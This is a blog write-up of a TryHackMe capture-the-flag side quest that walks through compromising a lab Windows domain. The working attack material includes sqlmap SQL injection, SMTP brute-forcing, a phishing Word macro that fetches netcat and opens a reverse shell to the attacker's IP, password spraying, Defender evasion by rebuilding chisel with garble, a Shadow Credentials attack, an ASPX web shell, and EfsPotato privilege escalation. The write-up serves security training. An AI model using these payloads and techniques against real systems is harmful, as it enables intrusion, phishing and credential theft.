---
title: "TryHackMe: AoC 2024 Side Quest Four"
author: jaxafed
categories: [TryHackMe]
date: 2025-01-01 00:00:04 +0000
tags: [web, sqli, smb, brute-forcing, phishing, bloodhound, active directory, shadow credentials, iis]
render_with_liquid: false
media_subpath: /images/tryhackme_aoc2024_sidequest_four/
image:
  path: room_image.webp
---

**Fourth Side Quest** started with discovering an **SQL injection** vulnerability in a web application on **Advent of Cyber Day 17**, which we exploited to dump the database. From the database, we discovered a URL pointing to a video, and in the video, we identified the keycard containing the password.

After using this password to disable the firewall, we connected to an **SMB** share on the target as a guest. There, we found a spreadsheet file containing a list of passwords. By testing these passwords along with email addresses found in the file's metadata against the target's mail services, we identified a valid combination that allowed us to read and send emails. Leveraging this, we sent a phishing email containing a Word document with a malicious macro, which gave us a shell.  

Using the shell to enumerate users, we discovered a password in one of the user's description. By spraying this password across all users, we found it also worked for another user.  

This user had a **Generic Write** privilege on another user, enabling us to perform a **Shadow Credentials** attack to obtain their **NTLM** hash and establish a shell using **WinRM**.  

The new user belonged to a group with write access to the **IIS** server's web root. This allowed us to gain a shell as the user running the **IIS** server, who had the **SeImpersonatePrivilege** enabled which allowed us to escalate to the **SYSTEM** user and complete the challenge.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/adventofcyber24sidequest){: .center }

## Finding the Keycard

While solving the `Advent of Cyber Day 17` challenge, we investigated the logs from a CCTV web server using **Splunk** and scanning the machine hosting the **Splunk** instance reveals the CCTV web server running on port **8080**.

![Web 8080 Index](web_8080_index.webp){: width="1200" height="600" }

On the web application, we find a login form at `http://10.10.143.134:8080/login.php`.

![Web 8080 Login](web_8080_login.webp){: width="1200" height="600" }

Trying to bypass this form and log in as the `byte` user we discovered in the logs, we try a simple `SQL Injection` in the username with `byte';-- -`, and we can see that this works.

![Web 8080 Login Sqli](web_8080_login_sqli.webp){: width="1000" height="500" }

But after bypassing the login and even logging in as the other users we discovered in the logs, we don't find the keycard. However, we can try using `sqlmap` to dump the database with this `SQL Injection` as follows:

```console
$ sqlmap -u 'http://10.10.143.134:8080/login.php' --method POST --data 'username=byte&password=&ok=Submit' --level 5 --risk 3 --threads 10 -p username --batch --dbs
...
available databases [2]:
[*] cctv_db
[*] information_schema
...
```
{: .wrap }

We can see the database for the web application as `cctv_db` and continue with dumping it.

```console
$ sqlmap -u 'http://10.10.143.134:8080/login.php' --method POST --data 'username=byte&password=&ok=Submit' --level 5 --risk 3 --threads 10 -p username --batch -D cctv_db --dump
...
Database: cctv_db
Table: recordings
[53 entries]
+----+--------+---------------------+---------+---------------------+
| id | cam_id | path                | minutes | date_recording      |
+----+--------+---------------------+---------+---------------------+
| 1  | 11     | /re[REDACTED]ed.mp4 | 5       | 2024-12-10 11:27:28 |
| 9  | 5      | /re[REDACTED]ed.mp4 | 10      | 2024-12-05 22:38:35 |
...
```
{: .wrap }

From the output of the `recordings` table, we can see the path for the deleted recordings is set as `/re[REDACTED]ed.mp4`. Visiting this video on the CCTV web server, a couple of seconds in, we can find the keycard with the password on it being `on[REDACTED]er`.

![Web 8080 Keycard](web_8080_keycard.webp){: width="1200" height="600" }

## Side Quest

Since we have the password on the keycard, we can move on to the side quest. As usual, we start by going to port `21337` on the target to disable the firewall.

![Web 21337 Index](web_21337_index.webp){: width="1200" height="600" }

### Initial Enumeration

Now that the firewall is disabled, we can start with an `nmap` scan.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.39.152
Nmap scan report for 10.10.39.152
Host is up (0.098s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Krampus Festival Login
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 NAMESPACE IDLE completed QUOTA OK CHILDREN RIGHTS=texkA0001 ACL CAPABILITY SORT IMAP4rev1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: FISHER, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: SOCMAS
|   NetBIOS_Domain_Name: SOCMAS
|   NetBIOS_Computer_Name: FISHER
|   DNS_Domain_Name: socmas.corp
|   DNS_Computer_Name: fisher.socmas.corp
|   DNS_Tree_Name: socmas.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-12-19T08:58:36+00:00
|_ssl-date: 2024-12-19T08:59:15+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=fisher.socmas.corp
| Not valid before: 2024-12-07T04:44:14
|_Not valid after:  2025-06-08T04:44:14
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  tcpwrapped
21337/tcp open  unknown
...
Service Info: Host: FISHER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Apart from the usual `Windows` services, we also see the `IMAP` and `SMTP` services running, which will be useful in a bit.

Additionally, we get the host name as `fisher` and the domain as `socmas.corp`, so we add it to our hosts file.

```
10.10.39.152 FISHER fisher.socmas.corp socmas.corp
```
{: file="/etc/hosts" }

Additionally, there is an `IIS` web server running on port 80. Checking it, we see a login form, but after testing it for a couple of vulnerabilities, we get nothing, so we move on.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

### Accessing the Emails

Using `netexec` to check the `SMB` shares accessible as a guest, we see that we have read access to the `ChristmasShare` share.

```console
$ nxc smb fisher.socmas.corp -u 'guest' -p '' --shares
SMB         10.10.39.152    445    FISHER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FISHER) (domain:socmas.corp) (signing:True) (SMBv1:False)
SMB         10.10.39.152    445    FISHER           [+] socmas.corp\guest:
SMB         10.10.39.152    445    FISHER           [*] Enumerated shares
SMB         10.10.39.152    445    FISHER           Share           Permissions     Remark
SMB         10.10.39.152    445    FISHER           -----           -----------     ------
SMB         10.10.39.152    445    FISHER           ADMIN$                          Remote Admin
SMB         10.10.39.152    445    FISHER           C$                              Default share
SMB         10.10.39.152    445    FISHER           ChristmasShare  READ
SMB         10.10.39.152    445    FISHER           IPC$            READ            Remote IPC
SMB         10.10.39.152    445    FISHER           NETLOGON                        Logon server share
SMB         10.10.39.152    445    FISHER           SYSVOL                          Logon server share
```

Checking the share using `smbclient`, we see four files in the share and download them.

```console
$ smbclient -U 'guest'%'' '\\fisher.socmas.corp\ChristmasShare'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Dec 16 21:13:45 2024
  ..                                  D        0  Mon Dec 16 21:13:45 2024
  approved.xlsx                       A     9626  Sat Dec  7 17:50:35 2024
  Designer (6).jpeg                   A   315407  Mon Dec 16 20:05:20 2024
  flag.txt                            A       65  Mon Dec 16 20:04:11 2024
  steg.png                            A   239043  Mon Dec 16 20:05:32 2024

                15728127 blocks of size 4096. 6164576 blocks available
smb: \> prompt off
smb: \> mget *
getting file \approved.xlsx of size 9626 as approved.xlsx (27.6 KiloBytes/sec) (average 27.6 KiloBytes/sec)
getting file \Designer (6).jpeg of size 315407 as Designer (6).jpeg (127.8 KiloBytes/sec) (average 115.4 KiloBytes/sec)
getting file \flag.txt of size 65 as flag.txt (0.2 KiloBytes/sec) (average 103.0 KiloBytes/sec)
getting file \steg.png of size 239043 as steg.png (126.7 KiloBytes/sec) (average 111.8 KiloBytes/sec)
```

Inside the `flag.txt` file, we find the first flag for the challenge, and inside the `approved.xlsx` file, we see a list of passwords.

![Password List](password_list.webp){: width="1200" height="600" }

We copy the passwords to create a wordlist as follows:

```console
$ cat passwords.txt
SantaClaus123
RudolphTheRed1
...
SnowGlobe42
FamilyGather2
```

Also, from the metadata of the file, we get two email addresses: `developer@test.corp` and `Administrator@SOCMAS.CORP`.

```console
$ exiftool approved.xlsx
...
Creator                         : developer@test.corp
Last Modified By                : Administrator@SOCMAS.CORP
...
```

We also create a wordlist from them as follows:

```console
$ cat emails.txt
developer@test.corp
Administrator@SOCMAS.CORP
```

Now, testing the email addresses and the passwords we have against the `SMTP` service running on the target using `hydra`, we are able to discover the password for the `developer@test.corp` account.

```console
$ hydra -L emails.txt -P passwords.txt fisher.socmas.corp smtp -s 587 -t 16
...
[587][smtp] host: fisher.socmas.corp   login: developer@test.corp   password: [REDACTED]
...
```

With these credentials, we can use `Thunderbird` and set it up as follows to easily read and send emails.

![Thunderbird Setup](thunderbird_setup.webp){: width="1200" height="600" }

In our inbox, we see an email from the `SFC` user asking us to send a Word document including the details for non-personal accounts.

![Thunderbird Email](thunderbird_email.webp){: width="1200" height="600" }

### Shell as scrawler

Since it asks us to send a Word document, we will use `Microsoft Word` to create a `.docm` file. We will add the `test` sub to download `netcat` and use it to send a reverse shell, and the `AutoOpen` sub to call the `test` sub when the document is opened.

```vb
Sub AutoOpen()
    Call test
End Sub

Sub test()
    Dim objshell As Object
    Set objshell = CreateObject("Wscript.Shell")
    objshell.Run "curl http://10.11.72.22/nc64.exe -o C:\ProgramData\nc64.exe", 0, True
    objshell.Run "C:\ProgramData\nc64.exe 10.11.72.22 443 -e powershell", 0, False
End Sub
```

![Word Document Macro](word_document_macro.webp){: width="1200" height="600" }

Now, we reply to the email asking for the document, attaching our `.docm` file with the reverse shell macro.

![Thunderbird Reply](thunderbird_reply.webp){: width="1200" height="600" }

After sending the email and waiting for a couple of seconds, we see that `netcat` is being downloaded from our web server.

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.39.152 - - [19/Dec/2024 10:50:25] "GET /nc64.exe HTTP/1.1" 200 -
```

We also get a shell as the `scrawler` user on our listener and can read the second flag at `C:\Users\scrawler\Desktop\user.txt`.

```
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.39.152] 65000
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
socmas\scrawler
PS C:\Windows\system32> type C:\Users\scrawler\Desktop\user.txt
THM{kr[REDACTED]0t}
```

### Access as Krampus_Debugger

Using our shell to check for users and their descriptions, we find a password in the description for the `Winterberry_Locksmit` user.

```console
PS C:\Windows\system32> Get-ADUser -Filter * -Property Description | Select-Object SamAccountName, Description

SamAccountName       Description
--------------       -----------
...
Winterberry_Locksmit PW: Ch[REDACTED]4!
...
```

Testing this password for the user using `netexec`, we see that it works.

```console
$ nxc smb fisher.socmas.corp -u 'Winterberry_Locksmit' -p 'Ch[REDACTED]4!'
SMB         10.10.39.152    445    FISHER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FISHER) (domain:socmas.corp) (signing:True) (SMBv1:False)
SMB         10.10.39.152    445    FISHER           [+] socmas.corp\Winterberry_Locksmit:Ch[REDACTED]4!
```

Also, running the `Get-ADUser -Filter * | Select-Object SamAccountName` command to get a list of all users, we create a wordlist out of them as follows:

```console
$ cat usernames.txt
Administrator
Guest
...
Blizzard_Defender
scrawler
```

Now, spraying the password we have for all users using `netexec`, we see that it also works for the `Krampus_Debugger` user.

```console
$ nxc smb fisher.socmas.corp -u usernames.txt -p 'Ch[REDACTED]4!' --continue-on-success
SMB         10.10.39.152    445    FISHER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:FISHER) (domain:socmas.corp) (signing:True) (SMBv1:False)
...
SMB         10.10.39.152    445    FISHER           [+] socmas.corp\Krampus_Debugger:Ch[REDACTED]4!
...
SMB         10.10.39.152    445    FISHER           [+] socmas.corp\Winterberry_Locksmit:Ch[REDACTED]4!
...
```

### Shell as Krampus_Shadow

Now that we have access to a couple of accounts, we can use `BloodHound` to enumerate the privileges for the accounts. However, we can't simply use `SharpHound` to collect the data since `Defender` is running on the target.

Instead, we can use `bloodhound-python` to collect the data from `LDAP` remotely. But since we can't reach the port for `LDAP`, we first need to use `chisel` to establish a proxy. However, since the default `chisel` executable is caught by `Defender`, we can use [garble](https://github.com/burrowers/garble) to build it ourselves to bypass `Defender` as follows:

```console
$ go install mvdan.cc/garble@latest
$ go install github.com/jpillora/chisel@latest
$ git clone https://github.com/jpillora/chisel chisel-src && cd chisel-src
$ env CGO_ENABLED=0 GOOS=windows GOARCH=amd64 garble -literals -tiny build -ldflags "-s -w -H windowsgui" -trimpath
```

First, we run our chisel server:

```console
$ chisel server -p 7777 --reverse --socks5
```

After that, we transfer the `chisel` executable we built to the server and run it to establish a **SOCKS** proxy.

```
PS C:\Windows\system32> curl http://10.11.72.22/chisel.exe -o C:\ProgramData\chisel.exe
PS C:\Windows\system32> C:\ProgramData\chisel.exe client 10.11.72.22:7777 R:socks
2024/12/19 11:49:04 client: Connecting to ws://10.11.72.22:7777
2024/12/19 11:49:05 client: Connected (Latency 83.2833ms)
```

Modifying our `proxychains` config to use the **SOCKS** proxy.

```
...
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5 127.0.0.1 1080
```
{: file="/etc/proxychains4.conf" }

We can now run `bloodhound-python` to collect data.

```console
$ proxychains -q bloodhound-python -ns 10.10.39.152 --dns-tcp -u 'Krampus_Debugger' -p 'Ch[REDACTED]4!' --zip -c All -d socmas.corp
```
{: .wrap }

Uploading the collected data to `BloodHound` and checking the rights our users have, we can see that the `Krampus_Debugger` has a `GenericWrite` right over the `Krampus_Shadow` user.

![Bloodhound Genericwrite](bloodhound_genericwrite.webp){: width="1200" height="600" }

We can use this to perform a `Shadow Credentials` attack and get the `NTLM` hash for the `Krampus_Shadow` user.

First, using `pywhisker` to add a `KeyCredential` to the `msDs-KeyCredentialLink` attribute of `Krampus_Shadow`.

```console
$ proxychains -q python3 pywhisker.py -d 'socmas.corp' -u 'Krampus_Debugger' -p 'Ch[REDACTED]4!' --target 'Krampus_Shadow' --action 'add'
[*] Searching for the target account
[*] Target user found: CN=Krampus_Shadow,OU=Devices,OU=FIN,OU=Tier 1,DC=socmas,DC=corp
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 275aaa0b-c9d0-628d-de25-a5a4ab409116
[*] Updating the msDS-KeyCredentialLink attribute of Krampus_Shadow
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: GOLdx7iM.pfx
[*] Must be used with password: GyaSIpAM2mCDZc1nkjaP
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
{: .wrap }

After that, we can use the `gettgtpkinit.py` tool from the `PKINITtools` along with the certificate and key generated by `pywhisker` to authenticate to the server and obtain a `TGT`.

```console
$ proxychains -q python3 gettgtpkinit.py SOCMAS.CORP/Krampus_Shadow -cert-pfx GOLdx7iM.pfx -pfx-pass GyaSIpAM2mCDZc1nkjaP krampus_shadow.ccache
2024-12-19 12:04:25,152 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-12-19 12:04:25,240 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-12-19 12:04:40,647 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-12-19 12:04:40,648 minikerberos INFO     ddfea8610c5e634577a7fbe5352990e1327649bbad61335f180b7df9d4e6c462
INFO:minikerberos:ddfea8610c5e634577a7fbe5352990e1327649bbad61335f180b7df9d4e6c462
2024-12-19 12:04:40,652 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```
{: .wrap }

At last, we can use the `getnthash.py` from `PKINITtools` to get the hash for the user after setting the `KRB5CCNAME` with the `TGT` we obtained.

```console
$ export KRB5CCNAME=krampus_shadow.ccache

$ proxychains -q python3 getnthash.py SOCMAS.CORP/Krampus_Shadow -key ddfea8610c5e634577a7fbe5352990e1327649bbad61335f180b7df9d4e6c462

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
5f[REDACTED]94
```
{: .wrap }

Checking the group memberships of the `Krampus_Shadow` user, we see they are a member of the `KrampusIIS` group, which is also a member of the `Remote Management Users` group.

![Bloodhound Groups](bloodhound_groups.webp){: width="1200" height="600" }

This means that we can use `evil-winrm` along with the hash we discovered to get a shell as follows:

```
$ evil-winrm -i fisher.socmas.corp -u Krampus_Shadow -H 5f[REDACTED]94

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\TEMP\Documents> whoami
socmas\krampus_shadow
```

### Shell as SYSTEM

Since the `Krampus_Shadow` user is a member of the `KrampusIIS` group, focusing on the `IIS` web server, we discover that the members of the `KrampusIIS` group have write access to the `C:\inetpub\wwwroot` directory.

```
*Evil-WinRM* PS C:\Users\TEMP\Documents> icacls C:\inetpub\wwwroot
C:\inetpub\wwwroot BUILTIN\IIS_IUSRS:(RX)
                   BUILTIN\IIS_IUSRS:(OI)(CI)(IO)(GR,GE)
                   NT AUTHORITY\SYSTEM:(I)(F)
                   CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                   NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                   SOCMAS\KrampusIIS:(I)(OI)(CI)(RX,W)
                   BUILTIN\Administrators:(I)(OI)(CI)(F)
                   BUILTIN\Users:(I)(OI)(CI)(RX)
                   NT SERVICE\TrustedInstaller:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

We can use this to drop an `ASPX` web shell and gain a shell as the user running the `IIS` web server.

First, we upload the [cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx) web shell to the server.

```
*Evil-WinRM* PS C:\Users\TEMP\Documents> curl http://10.11.72.22/cmd.aspx -o C:\inetpub\wwwroot\cmd.aspx
```
{: .wrap }

Now, visiting `http://fisher.socmas.corp/cmd.aspx`, we can see our web shell.

![Web 80 Webshell](web_80_webshell.webp){: width="1200" height="600" }

And using it to run the `C:\ProgramData\nc64.exe 10.11.72.22 443 -e powershell` command, we get a shell as the `DefaultAppPool` account.

```
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.39.152] 57858
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

Checking the privileges for this account, we see that the `SeImpersonatePrivilege` privilege is enabled.

```
PS C:\windows\system32\inetsrv> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We can use this with one of the potato exploits to escalate to the `SYSTEM` user.

First, we transfer the [EfsPotato.cs](https://github.com/zcgonvh/EfsPotato/blob/master/EfsPotato.cs) to the machine.

```
PS C:\ProgramData> curl http://10.11.72.22/EfsPotato.cs -o C:\ProgramData\EfsPotato.cs
```

Now, using `csc.exe` on the machine to build the exploit:

```
PS C:\ProgramData> C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```

Lastly, we can run the exploit and use the `netcat` we uploaded before to get a shell.

```
PS C:\ProgramData> C:\ProgramData\EfsPotato.exe "C:\ProgramData\nc64.exe 10.11.72.22 443 -e powershell"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: IIS APPPOOL\DefaultAppPool
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=4e9430)
[+] Get Token: 780
[!] process with pid: 1244 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818
```

With this, we get a shell as the `SYSTEM` user and can read the third flag at `C:\Users\Krampus_Proxy\Desktop\root.txt` to complete the challenge.

```
$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.39.152] 55315
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\ProgramData> whoami
nt authority\system
PS C:\ProgramData> type C:\Users\Krampus_Proxy\Desktop\root.txt
THM{kr[REDACTED]ad}
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>